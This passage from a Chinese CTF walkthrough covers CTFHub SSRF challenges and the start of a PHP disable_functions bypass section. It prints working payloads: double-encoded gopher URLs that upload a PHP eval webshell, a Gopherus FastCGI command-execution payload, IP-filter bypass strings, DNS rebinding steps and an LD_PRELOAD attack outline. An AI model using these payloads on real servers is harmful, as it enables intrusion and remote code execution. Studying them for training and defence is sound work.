href="http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=_">http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=_</a></p></blockquote><p>打开什么都没有，尝试一下10.1的内网访问</p><blockquote><p><a href="http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php">http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</a></p></blockquote><p>查看源码发现信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=0dc2b8bce30276f8d0f0cb1472eb6c7d--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>是一个表单，要用POST方式提交key到flag.php上。因为要发送的不是php代码所以不能用php://input方式，但可以用gopher协议(curl支持gopher伪协议)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://ip:port/_payload(注意有下划线)</span><br></pre></td></tr></table></figure><p>构造POST内容，特别要注意Content-Length应为key的整个长度。将内容拿去URL编码2次(按理说是3次，但我们是在URL上构造，最后一次编码按回车浏览器会自动帮我们第3次编码)，第一次URL编码后要手动在所有%0A前面加上%0D(%0A是在linux系统中代表换行符，在windows中是%0D0A代表换行符，但是网上的编码器大都是编码的%0A，所以我们需要改成windows能够识别的)，再进行后续编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line"></span><br><span class="line">key=0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//第1次URL编码</span><br><span class="line">POST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application/x-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br><span class="line">//加上%0D</span><br><span class="line">POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br><span class="line">//第2次URL编码</span><br><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br><span class="line">//构造URL</span><br><span class="line">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d</span><br></pre></td></tr></table></figure><h2 id="16-5-上传文件"><a href="#16-5-上传文件" class="headerlink" title="16.5 上传文件"></a>16.5 上传文件</h2><blockquote><p>这次需要上传一个文件到flag.php了.祝你好运</p></blockquote><p>题目提示有flag.php，先打开看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-1897762186ae66ce.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>发现有上传文件的接口，但没有提交按钮。那就自己做一个。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接这样提交一句话木马的话会出现</p><blockquote><p> Just View From 127.0.0.1 </p></blockquote><p>那我们抓一个包来用gopher构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------1114439304559070182630578745</span><br><span class="line">Content-Length: 287</span><br><span class="line"></span><br><span class="line">-----------------------------1114439304559070182630578745</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;hello world&quot;;</span><br><span class="line">eval($_POST[&#x27;caidao&#x27;]); ?&gt;</span><br><span class="line">-----------------------------1114439304559070182630578745--</span><br></pre></td></tr></table></figure><p>进行两次URL编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//第1次</span><br><span class="line">POST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D---------------------------1114439304559070182630578745%0D%0AContent-Length%3A%20287%0D%0A%0D%0A-----------------------------1114439304559070182630578745%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22shell1.php%22%0D%0AContent-Type%3A%20application/octet-stream%0D%0A%0D%0A%3C%3Fphp%20%0D%0Aecho%20%22hello%20world%22%3B%0D%0Aeval%28%24_POST%5B%27caidao%27%5D%29%3B%20%3F%3E%0D%0A-----------------------------1114439304559070182630578745--</span><br><span class="line">//第2次</span><br><span class="line">POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--</span><br><span class="line">//构造URL</span><br><span class="line">/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;58dfbf57568807f03726d88b&#125;</span><br></pre></td></tr></table></figure><h2 id="16-6-FastCGI协议"><a href="#16-6-FastCGI协议" class="headerlink" title="16.6 FastCGI协议"></a>16.6 FastCGI协议</h2><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。</p><p>FastCGI协议分析</p><p><a href="https://blog.csdn.net/mysteryflower/article/details/94386461">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p><p>方法一：利用脚本</p><p><a href="https://blog.csdn.net/qq_51652864/article/details/118697060">https://blog.csdn.net/qq_51652864/article/details/118697060</a></p><p>监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9000 &gt; 1.txt //监听的内容写到1.txt去</span><br></pre></td></tr></table></figure><p>方法二：利用gopherus</p><p>Gopherus安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus</span><br></pre></td></tr></table></figure><p>去到Gopherus目录，利用fastcgi</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python gopherus.py --exploit fastcgi</span><br></pre></td></tr></table></figure><p>填入<code>/var/www/html/index.php</code>和<code>whoami</code>，获得payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if you don&#x27;t know press ENTER we have default one:  /var/www/html/index.php  </span><br><span class="line">Terminal command to run:  whoami</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF:                 </span><br><span class="line">gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br></pre></td></tr></table></figure><h2 id="16-7-URL-Bypass"><a href="#16-7-URL-Bypass" class="headerlink" title="16.7 URL Bypass"></a>16.7 URL Bypass</h2><p>url跳转bypass：<br>1.利用<code>?</code>绕过限制url=<a href="https://www.baidu.com?www.xxxx.me">https://www.baidu.com?www.xxxx.me</a><br>2.利用<code>@</code>绕过限制url=<a href="https://www.baidu.com@www.xxxx.me">https://www.baidu.com@www.xxxx.me</a><br>3.利用斜杠反斜杠绕过限制<br>4.利用<code>#</code>绕过限制url=<a href="https://www.baidu.com#www.xxxx.me">https://www.baidu.com#www.xxxx.me</a><br>5.利用子域名绕过<br>6.利用畸形url绕过<br>7.利用跳转ip绕过 </p><blockquote><p>请求的URL中必须包含<a href="http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p></blockquote><p>给出提示，url参数的值中必须包含有<a href="http://notfound.ctfhub.com">http://notfound.ctfhub.com</a><br>可以采用@，也就是 HTTP 基本身份认证绕过。<br>HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。<br>也就是：<a href="http://www.xxx.com@www.yyy.com形式">http://www.xxx.com@www.yyy.com形式</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><h2 id="16-8-数字IP-Bypass"><a href="#16-8-数字IP-Bypass" class="headerlink" title="16.8 数字IP Bypass"></a>16.8 数字IP Bypass</h2><ul><li>IP进制转换：将点分十进制的IP格式转为其他【八进制】【十六进制】等格式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br><span class="line">http://127.0.0.1  &gt;&gt;&gt;  http://127001/</span><br><span class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</span><br><span class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</span><br></pre></td></tr></table></figure><ul><li>Enclosed Alphanumerics：由英文字母数字组成的Unicode字符集，位于圆圈，括号或其他未封闭的封闭空间内，或以句号结尾。如下</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">①②⑦.⓿.⓿.①  &gt;&gt;&gt; 127.0.0.1</span><br></pre></td></tr></table></figure><ul><li>特殊地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0/  # 0.0.0.0可以直接访问到本地</span><br><span class="line">http://127。0。0。1  # 绕过后端正则规则</span><br><span class="line">http://localhost/</span><br></pre></td></tr></table></figure><blockquote><p>这次ban掉了127以及172，不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢 </p></blockquote><p>首先看看<a href="http://challenge-36ebaf025673bdcd.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php">http://challenge-36ebaf025673bdcd.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</a></p><blockquote><p>hacker! Ban ‘/127|172|@/‘</p></blockquote><p>说过滤了127，172还有@，经过验证， 以下url值也都可以绕过爆出flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://0x7f000001/flag.php</span><br><span class="line">http://localhost/flag.php</span><br><span class="line">http://2130706433/flag.php</span><br><span class="line">http://0/flag.php</span><br><span class="line">http://localhost/flag.php</span><br></pre></td></tr></table></figure><h2 id="16-9-302跳转-Bypass"><a href="#16-9-302跳转-Bypass" class="headerlink" title="16.9 302跳转 Bypass"></a>16.9 302跳转 Bypass</h2><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，这个时候可以尝试使用302跳转的方式来进行绕过。</p><p><strong>xip.io</strong></p><p>What is xip.io?<br>xip.io is a magic domain name that provides wildcard DNS<br>for any IP address. Say your LAN IP address is 10.0.0.1.<br>Using xip.io,即以如下规则进行域名解析</p><pre><code>10.0.0.1.xip.io   resolves to   10.0.0.1www.10.0.0.1.xip.io   resolves to   10.0.0.1mysite.10.0.0.1.xip.io   resolves to   10.0.0.1foo.bar.10.0.0.1.xip.io resolves to 10.0.0.1</code></pre><p><strong>短网址</strong></p><p>顾名思义就是在形式上比较短的网址，借助短网址您可以用简短的网址替代原来冗长的网址，让使用者可以更容易的分享链接。</p><p>访问短网址会自动跳转到原来冗长的网址，利用短网址这个特性，我们可以绕过URL参数检测的黑名单。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 短网址工具域名： https://www.985.so/</span><br><span class="line">http://127.0.0.1/flag.php ---&gt; http://r6d.cn/b2mk6</span><br></pre></td></tr></table></figure><blockquote><p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧。</p></blockquote><p>依旧尝试一下<a href="http://challenge-5b889e8b9c4e4f67.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php">http://challenge-5b889e8b9c4e4f67.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</a></p><blockquote><p> hacker! Ban Intranet IP </p></blockquote><p>它说把<code>127.0.0.1</code>都给过滤了，所以用<code>.xip.io</code>不行，但用短网址与10.8的某些地址就可以轻松绕过。</p><h2 id="16-10-DNS重绑定攻击"><a href="#16-10-DNS重绑定攻击" class="headerlink" title="16.10 DNS重绑定攻击"></a>16.10 DNS重绑定攻击</h2><p>根据流程图：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL（TTL表示DNS记录在DNS服务器上缓存时间）时间为0，这是为了防止有DNS服务器对第一次的解析结果进行缓存。</p><p>完整的DNS重绑定攻击流程为：</p><ol><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为指定范围IP，则通过验证</li><li>接下来服务器端对URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的内容</li></ol><p>设置好两个地址，就会自动生成域名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 工具域名： https://lock.cmpxchg8b.com/rebinder.html</span><br><span class="line"># 使用两个IP地址，分别为</span><br><span class="line">163.177.151.109 # 作用：第一次DNS解析后IP判断在指定范围内（随意一个可访问的公网地址）</span><br><span class="line">127.0.0.1       # 作用：第二次DNS解析，不用判断直接访问内网flag.php</span><br><span class="line"></span><br><span class="line">7f000001.a3b1976d.rbndr.us</span><br></pre></td></tr></table></figure><p>抓包，将url改为域名，就得flag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=7f000001.a3b1976d.rbndr.us/flag.php HTTP/1.1</span><br></pre></td></tr></table></figure><h1 id="17-Bypass-disable-function"><a href="#17-Bypass-disable-function" class="headerlink" title="17.  Bypass disable_function"></a>17.  Bypass disable_function</h1><p>PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用。有四种绕过 disable_functions 的手法：</p><ul><li>攻击后端组件，寻找存在命令注入的 web 应用常用的后端组件，如ImageMagick 的魔图漏洞、bash 的破壳漏洞等等；</li><li>寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；</li><li>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）；</li><li>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</li></ul><p>在学习php时，发现有许多函数会对网站或系统造成很大危险隐患，常见的危险函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line">功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 <span class="title function_ invoke__">exec</span>()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line">功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 <span class="title function_ invoke__">passthru</span>()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chroot</span>()</span><br><span class="line">功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式</span><br><span class="line">PHP 时才能工作，且该函数不适用于 Windows 系统。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">scandir</span>()</span><br><span class="line">功能描述：列出指定路径中的文件和目录。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chgrp</span>()</span><br><span class="line">功能描述：改变文件或目录所属的用户组。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chown</span>()</span><br><span class="line">功能描述：改变文件或目录的所有者。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line">功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line">功能描述：执行一个命令并打开文件指针用于读取以及写入。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">proc_get_status</span>()</span><br><span class="line">功能描述：获取使用 <span class="title function_ invoke__">proc_open</span>() 所打开进程的信息。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_log</span>()</span><br><span class="line">功能描述：将错误信息发送到指定位置（文件）。</span><br><span class="line">安全备注：在某些版本的 PHP 中，可使用 <span class="title function_ invoke__">error_log</span>() 绕过 PHP safe mode，</span><br><span class="line">执行任意命令。</span><br><span class="line">危险等级：低</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_alter</span>()</span><br><span class="line">功能描述：是 <span class="title function_ invoke__">ini_set</span>() 函数的一个别名函数，功能与 <span class="title function_ invoke__">ini_set</span>() 相同。</span><br><span class="line">具体参见 <span class="title function_ invoke__">ini_set</span>()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>()</span><br><span class="line">功能描述：可用于修改、设置 PHP 环境配置参数。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_restore</span>()</span><br><span class="line">功能描述：可用于恢复 PHP 环境配置参数到其初始值。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">dl</span>()</span><br><span class="line">功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pfsockopen</span>()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">syslog</span>()</span><br><span class="line">功能描述：可调用 UNIX 系统的系统层 <span class="title function_ invoke__">syslog</span>() 函数。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">readlink</span>()</span><br><span class="line">功能描述：返回符号连接指向的目标文件内容。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">symlink</span>()</span><br><span class="line">功能描述：在 UNIX 系统中建立一个符号链接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line">功能描述：可通过 <span class="title function_ invoke__">popen</span>() 的参数传递一条命令，并对 <span class="title function_ invoke__">popen</span>() 所打开的文件进行执行。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_socket_server</span>()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 服务器连接。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>()</span><br><span class="line">功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 <span class="number">5.2</span>.<span class="number">6</span> 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</span><br><span class="line">危险等级：高</span><br></pre></td></tr></table></figure><h2 id="17-1-LD-PRLOAD"><a href="#17-1-LD-PRLOAD" class="headerlink" title="17.1 LD_PRLOAD"></a>17.1 LD_PRLOAD</h2><p>LD_PRELOAD可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。<strong>通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</strong>一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p><blockquote><p>我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，默认情况下，所编译的程序中对标准C函数的链接，都是通过动态链接方式来链接libc.so.6这个函数库的。</p></blockquote><p>程序中我们经常要调用一些外部库的函数，以sendmail程序中的geteuid()为例，如果我们有个自定义的geteuid()函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用geteuid()函数时，调用的其实是我们自定义的geteuid()函数。而在PHP中error_log()和mail()函数在传入特定参数时都会调用到sendmail外部程序进而调用外部库的函数geteuid()。</p><p>所以我们的思路是：在已获得webshell但被PHP的disable_function禁用了一些危险函数的命令执行的情况下</p><ol><li>编写好动态链接库文件并上传到服务器</li><li>编写PHP文件并上传到服务器，内容为：<br>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径，然后 配合php的某个函数（例如error_log()或mail()函数）去触发运行动态链接库然后执行我们的恶意动态链接库文件</li><li>在浏览器去浏览我们写的PHP文件</li></ol><p>例：hcfhub-web进阶-Bypass disable_function-LD_PRLOAD</p><p>打开链接页面显示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 